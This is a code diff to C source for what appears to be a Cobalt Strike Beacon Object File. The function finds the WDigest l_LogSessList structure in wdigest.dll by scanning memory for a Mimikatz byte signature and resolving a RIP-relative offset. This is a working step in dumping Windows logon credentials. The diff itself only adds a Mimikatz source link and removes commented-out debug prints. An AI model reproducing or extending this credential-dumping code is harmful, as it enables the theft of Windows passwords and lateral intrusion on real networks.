@@ -5,12 +5,12 @@
 #include "defs.h"
 
 // Signature used to find l_LogSessList (PTRN_WIN6_PasswdSet from Mimikatz) - works on windows 10
+// https://github.com/gentilkiwi/mimikatz/blob/152b208916c27d7d1fc32d10e64879721c4d06af/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_wdigest.c#L14C6-L14C25
 unsigned char logSessListSig[] = { 0x48, 0x3b, 0xd9, 0x74 };
 
 DWORD64 SearchForLogSessList(void)
 {
     PBYTE wdigestImageBase = (PBYTE)GetModuleHandleA("wdigest.dll");
-    //DEBUG_PRINT("Loaded wdigest.dll at address %p\n", wdigestImageBase);
 
     PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)wdigestImageBase;
     PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)((PBYTE)pDosHdr + pDosHdr->e_lfanew);
@@ -23,11 +23,9 @@ DWORD64 SearchForLogSessList(void)
         BeaconFormatPrintf(&outputbuffer, "[!] Could not find l_LogSessList pattern signature\n");
         return -1;
     }
-    //DEBUG_PRINT("Found l_LogSessList pattern offset at 0x%lx\n", logSessListSig_PatternOffset);
 
     // Get the full address where the mimikatz byte pattern was found
     PBYTE logSessList_PatternAddress = wdigestTextBase + logSessListSig_PatternOffset;
-    //DEBUG_PRINT("Address to l_LogSessList pattern: 0x%llx\n", logSessList_PatternAddress);
 
     // Now get the RIP offset from the pattern address so we can use it later
     // May look like  "48 8d 0d 97 f8 01 00    lea rcx,[rip+0x1f897] # 0x1f89e"  and we want to get the 0x1f897
@@ -37,10 +35,8 @@ DWORD64 SearchForLogSessList(void)
         (logSessList_PatternAddress[-3] << 8) |
         (logSessList_PatternAddress[-4]);
 
-    //DEBUG_PRINT("l_LogSessList Rip Offset : 0x%llx\n", logSessList_RipOffset);
 
     DWORD64 Real_l_LogSessListHead_Address = logSessList_PatternAddress + logSessList_RipOffset;
-    //DEBUG_PRINT("[*] Real LogSessList address: 0x%llx\n", Real_l_LogSessListHead_Address);
 
     return Real_l_LogSessListHead_Address;
 }
